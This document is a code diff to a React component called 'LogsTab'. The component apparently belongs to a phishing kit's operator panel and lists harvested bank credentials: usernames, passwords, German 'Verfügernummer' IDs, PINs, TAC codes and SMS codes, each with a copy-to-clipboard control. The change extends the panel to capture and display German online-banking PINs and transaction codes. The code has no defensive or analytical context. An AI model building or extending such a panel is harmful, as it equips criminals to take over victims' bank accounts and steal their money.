@@ -446,10 +446,11 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     </td>
                     <td className="px-4 py-3">
                       <div className="text-xs space-y-1">
-                        {fd.bankName && <div className="font-bold text-yellow-500">{fd.bankName}</div>}
-                        {fd.username && <div><span className="opacity-50">K:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard(fd.username)}>{fd.username}</span></div>}
-                        {fd.password && <div><span className="opacity-50">Ş:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard(fd.password)}>{fd.password}</span></div>}
-                      </div>
+                          {fd.bankName && <div className="font-bold text-yellow-500">{fd.bankName}</div>}
+                          {(fd.username || fd.verfuegernummer) && <div><span className="opacity-50">K:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard((fd.username || fd.verfuegernummer) as string)}>{fd.username || fd.verfuegernummer}</span></div>}
+                          {(fd.password || fd.pin) && <div><span className="opacity-50">Ş:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard((fd.password || fd.pin) as string)}>{fd.password || fd.pin}</span></div>}
+                          {fd.tacCode && <div><span className="opacity-50">TAC:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard(fd.tacCode as string)}>{fd.tacCode}</span></div>}
+                        </div>
                     </td>
                     <td className="px-4 py-3">
                       <div className="cursor-pointer font-mono tracking-widest text-indigo-400 hover:underline" onClick={() => copyToClipboard(fd.smsCode)}>
